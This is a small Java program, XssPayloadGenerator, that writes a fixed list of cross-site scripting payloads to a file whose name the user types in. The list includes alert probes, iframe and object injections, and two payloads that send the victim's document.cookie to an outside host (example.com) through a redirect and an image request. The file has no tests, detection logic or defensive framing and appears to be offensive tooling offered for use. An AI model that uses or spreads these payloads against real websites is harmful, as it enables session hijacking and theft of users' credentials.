import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.util.List;
import java.util.Scanner;

public class XssPayloadGenerator {

    private List<String> payloadList;
    private String outputFile;

    // Constructor, getters, and setters

    public void generatePayloads() {
        payloadList = List.of(
                "<script>alert('XSS');</script>",
                "<script>document.write('<img src=x onerror=alert(\"XSS\")>');</script>",
                "<script>document.location='http://example.com/xss.html?c='+document.cookie;</script>",
                "<img src='http://example.com/xss.gif?c='+document.cookie>",
                "<object data='http://example.com/xss.svg#xss'></object>",
                "<iframe src='http://example.com/xss.html'></iframe>"
        );

        try (BufferedWriter writer = new BufferedWriter(new FileWriter(outputFile))) {
            for (String payload : payloadList) {
                writer.write(payload + System.lineSeparator());
            }
        } catch (IOException e) {
            System.err.println("Error: " + e.getMessage());
        }
        System.out.println("Payloads generated in " + outputFile);
    }

    public void selectOutputFile() {
        Scanner scanner = new Scanner(System.in);
        System.out.println("Enter the name of the output file:");
        outputFile = scanner.nextLine();
    }

    public static void main(String[] args) {
        XssPayloadGenerator xssPayloadGenerator = new XssPayloadGenerator();
        xssPayloadGenerator.selectOutputFile();
        xssPayloadGenerator.generatePayloads();
    }
}
